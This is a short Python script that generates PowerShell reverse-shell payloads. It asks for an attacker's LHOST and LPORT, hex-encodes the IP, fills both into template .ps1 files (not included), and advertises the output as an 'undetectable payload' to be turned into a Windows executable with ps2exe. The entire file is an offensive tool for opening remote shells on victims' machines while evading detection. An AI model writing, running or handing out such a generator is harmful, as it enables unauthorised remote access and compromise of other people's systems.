import os

os.system("cls||clear")
print("1. powershell reverse shell-small")
print("2. powershell reverse shell-big")
question = input("choose your undetectable payload 1/2 => ")
if question == ("1"):
  lhost = input("LHOST => ")
  lport = input("LPORT => ")
  def ip2hex(ip):
      return "0x" + "".join(map(lambda i: "{:02X}".format(int(i)), ip.split(".")))
  if __name__ == '__main__':
      lhost_hex = ip2hex(lhost)  
  rev_small = open("payloads/powershell-reverse-shell-small.ps1", "rt")
  output = open("payload.ps1", "wt")
  for line in rev_small:
    output.write(line.replace("{lhost}", lhost_hex).replace("{lport}", lport))
  rev_small.close()
  output.close()
  print("payload generated as payload.ps1")
  print("now you can convert your payload.ps1 to an executable with ps2exe on windows.")
elif question == ("2"):
  lhost_big = input("LHOST => ")
  lport_big = input("LPORT => ")
  def ip2hex_big(ip):
      return "0x" + "".join(map(lambda i: "{:02X}".format(int(i)), ip.split(".")))
  if __name__ == '__main__':
      lhost_big_hex = ip2hex_big(lhost_big)  
  rev_big = open("payloads/powershell-reverse-shell-big.ps1", "rt")
  output_big = open("payload_big.ps1", "wt")
  for line in rev_big:
    output_big.write(line.replace("{lhost}", lhost_big_hex).replace("{lport}", lport_big))
  rev_big.close()
  output_big.close()
  print("payload generated as payload_big.ps1")
  print("now you can convert your payload.ps1 to an executable with ps2exe on windows.")
else:
  print("please type 1 or 2")